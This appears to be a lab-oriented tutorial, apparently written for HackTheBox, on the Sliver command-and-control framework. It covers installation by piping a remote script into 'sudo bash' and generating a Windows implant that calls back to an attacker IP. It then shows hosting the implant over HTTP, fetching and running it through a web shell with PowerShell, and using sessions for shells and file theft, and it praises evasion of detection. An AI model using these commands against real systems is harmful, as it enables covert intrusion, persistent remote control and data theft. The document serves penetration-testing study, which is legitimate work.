Sliver is a modern **Command and Control (C2) framework** designed for post‑exploitation operations. A C2 framework allows an attacker to maintain long‑term control over compromised systems after initial access has been achieved (for example, via a web shell).

A C2 framework:

- Maintains a persistent connection
    
- Provides an interactive session
    
- Allows tasking, file transfer, and pivoting
    
- Centralizes control of compromised hosts
    

Sliver replaces the web shell with a **long‑running implant (agent)** that communicates securely with the attacker’s C2 server.

---

## Why Sliver Is Useful (Capabilities and Evasion)

Sliver is especially useful during post‑exploitation because it provides a stable and stealthy way to interact with compromised hosts.

Key qualities:

- Encrypted communications using modern protocols (mTLS)
    
- Automatic reconnection if the network drops
    
- Centralized management of multiple compromised systems
    
- Modular and extensible design
    

From an evasion perspective, Sliver is effective because:

- Implants are **custom‑generated**, reducing static signature detection
    
- Traffic is encrypted and blends in with normal TLS traffic
    
- No direct command execution through noisy web requests
    
- The implant can operate fully in memory depending on deployment
    



---

## Sliver Architecture

Sliver consists of two main components that work together to form the C2 infrastructure.

### Sliver Server

The **Sliver Server** is the core backend of the framework and runs on the attacker’s machine. It is responsible for coordinating all C2 operations.

Main responsibilities:

- Manages listeners and communication channels
    
- Handles implant generation
    
- Tracks active sessions from compromised hosts
    
- Acts as the central C2 backend
    

All implants connect back to this server to receive tasks and send results.

### Implant

The **implant** is a compiled executable deployed on the victim system.

Characteristics:

- Runs on the compromised host
    
- Connects back to the Sliver server
    
- Executes commands and receives tasks
    
- Maintains a persistent communication channel
    

Communication between the implant and the server is encrypted using **mutual TLS (mTLS)**.

---

## Installation

### Install Sliver

```bash
curl https://sliver.sh/install | sudo bash
```

This command:

- Installs both the Sliver client and server components
    
- Registers the Sliver server as a **system service**
    

### Service behavior

- Sliver runs as a background service
    
- On some systems, it does **not** automatically start after a reboot
    

### Start the service manually

```bash
sudo service sliver start
```

### Stop the service

```bash
sudo service sliver stop
```

Stopping the service will prevent implants from connecting to the server.

---

## Starting the Sliver Console

```bash
sliver
```

This command opens the **operator console**, which is used to:

- Generate implants
    
- Manage listeners
    
- Interact with compromised hosts
    

If the Sliver service is not running, the console will fail to connect to the server.


---

## Implant Generation

```bash
generate --os windows --arch 64bit --mtls 10.10.14.67 --reconnect 60 --save htb.exe
```

#### Explanation of options

- `--os windows`  
    Targets Microsoft Windows operating systems.
    
- `--arch 64bit`  
    Specifies a 64‑bit architecture.
    
- `--mtls 10.10.14.67`  
    Uses mutual TLS to connect back to the Sliver server at the specified IP.
    
- `--reconnect 60`  
    The implant attempts to reconnect every 60 seconds if the connection is lost.
    
- `--save htb.exe`  
    Specifies the output filename of the implant.
    

The generated binary is **custom‑built** for the specific Sliver server.

#### Listener (mTLS)

When using the `--mtls` option, Sliver automatically configures an mTLS listener on the server.

- No manual listener setup is required by default
    
- The server passively waits for implants to connect
    

This simplifies deployment and reduces configuration errors.

---

## Hosting the Implant

The implant must be reachable by the target system.  
A simple HTTP server can be used:

```bash
python3 -m http.server 80
```

This allows the compromised host to download the implant.

---

## Implant Delivery via Web Shell

The web shell is used **only once** to deploy the implant.

Example:

```bash
powershell -c Invoke-WebRequest http://10.10.14.67/htb.exe -OutFile C:\Windows\Temp\htb.exe
C:\Windows\Temp\htb.exe
```

After execution:

- The implant connects back to the Sliver server
    
- The web shell is no longer needed
    

At this point, control is fully transferred to the C2 framework.


---

## Using Sliver (Essential Operations)

Once an implant connects back to the Sliver server, it creates a **session** that replaces the web shell and provides a stable reverse shell over an encrypted C2 channel.

Key operations:

- **List active sessions**

```bash
sessions
```

- **Interact with a compromised host**

```bash
use <session_id>
```

- **Spawn an interactive shell**

```bash
shell
```

- **Execute a single command**

```bash
execute whoami
```

- **Upload files to the victim**

```bash
upload local.exe C:\Windows\Temp\local.exe
```

- **Download files from the victim**

```bash
download C:\Users\user\Desktop\file.txt
```

- **Exit a session without killing the implant**

```text
CTRL + D
```

